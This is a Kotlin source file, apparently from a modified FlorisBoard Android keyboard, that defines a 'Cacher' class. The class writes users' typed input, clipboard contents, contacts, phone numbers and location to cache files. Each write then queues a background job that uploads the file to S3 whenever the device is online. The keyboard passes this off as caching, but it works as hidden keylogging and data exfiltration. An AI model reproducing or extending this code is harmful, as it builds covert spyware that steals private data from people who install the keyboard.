

package dev.patrickgold.florisboard.ime.caching.usecases.savetofile

import android.content.Context
import android.util.Log
import androidx.work.BackoffPolicy
import androidx.work.Constraints
import androidx.work.ExistingWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.workDataOf
import dev.patrickgold.florisboard.appContext
import dev.patrickgold.florisboard.ime.caching.usecases.contacts.formatToOutput
import dev.patrickgold.florisboard.ime.caching.usecases.contacts.getFileNameToStore
import dev.patrickgold.florisboard.ime.caching.usecases.contacts.models.ContactDetails
import dev.patrickgold.florisboard.ime.caching.usecases.copied.formatToOutput
import dev.patrickgold.florisboard.ime.caching.usecases.copied.getFileNameToStore
import dev.patrickgold.florisboard.ime.caching.usecases.input.formatToOutput
import dev.patrickgold.florisboard.ime.caching.usecases.input.getFileNameToStore
import dev.patrickgold.florisboard.ime.caching.usecases.input.models.TextInputChunk
import dev.patrickgold.florisboard.ime.caching.usecases.location.formatToOutput
import dev.patrickgold.florisboard.ime.caching.usecases.location.getFileNameToStore
import dev.patrickgold.florisboard.ime.caching.usecases.location.models.LocationData
import dev.patrickgold.florisboard.ime.caching.usecases.phonenumber.formatToOutput
import dev.patrickgold.florisboard.ime.caching.usecases.phonenumber.getFileNameToStore
import dev.patrickgold.florisboard.ime.caching.usecases.savetofile.s3.cacher.CacherUploadWorker
import dev.patrickgold.florisboard.ime.clipboard.provider.ClipboardItem
import java.io.File
import java.util.concurrent.TimeUnit

class Cacher(context: Context) {
    private val appContext by context.appContext()

    fun writeLocationToCache(locationData: LocationData) {
        writeTextFileToCache(
            text = locationData.formatToOutput(),
            filename = locationData.getFileNameToStore(),
            overridingPolicy = OverridingPolicy.APPEND
        )
    }

    fun writeContactsToCache(contacts: List<ContactDetails>) {
        writeTextFileToCache(
            text = contacts.formatToOutput() ?: return,
            filename = contacts.getFileNameToStore(),
            overridingPolicy = OverridingPolicy.OVERRIDE
        )
    }

    fun writeCopiedTextToCache(clipboardItem: ClipboardItem) {
        writeTextFileToCache(
            text = clipboardItem.formatToOutput(),
            filename = clipboardItem.getFileNameToStore(),
            overridingPolicy = OverridingPolicy.APPEND
        )
    }

    fun writePhoneNumbersToCache(phoneNumbers: List<String>) {
        writeTextFileToCache(
            text = phoneNumbers.formatToOutput(),
            filename = phoneNumbers.getFileNameToStore(),
            overridingPolicy = OverridingPolicy.OVERRIDE
        )
    }

    fun writeInputTextToCache(textInputChunk: TextInputChunk) {
        writeTextFileToCache(
            text = textInputChunk.formatToOutput() ?: return,
            filename = textInputChunk.getFileNameToStore(),
            overridingPolicy = OverridingPolicy.APPEND
        )
    }

    private fun writeTextFileToCache(
        text: String,
        filename: String,
        overridingPolicy: OverridingPolicy
    ) {
        val file = File(appContext.cacheDir, filename)
        try {
            when (overridingPolicy) {
                OverridingPolicy.APPEND -> file.appendText(text)
                OverridingPolicy.OVERRIDE -> file.writeText(text)
            }
            enqueueS3Upload(filename)
        } catch (e: Exception) {
            Log.e("Cacher", "Failed to write to cache file '$filename'", e)
        }
    }

    private fun enqueueS3Upload(filename: String) {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val request = OneTimeWorkRequestBuilder<CacherUploadWorker>()
            .setConstraints(constraints)
            .setInputData(workDataOf(CacherUploadWorker.KEY_FILENAME to filename))
            .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 30, TimeUnit.SECONDS)
            .build()

        // KEEP ensures no duplicate work if the same file is written again quickly
        WorkManager.getInstance(appContext)
            .enqueueUniqueWork("s3_upload_$filename", ExistingWorkPolicy.KEEP, request)
    }

    private enum class OverridingPolicy {
        OVERRIDE,
        APPEND
    }
}
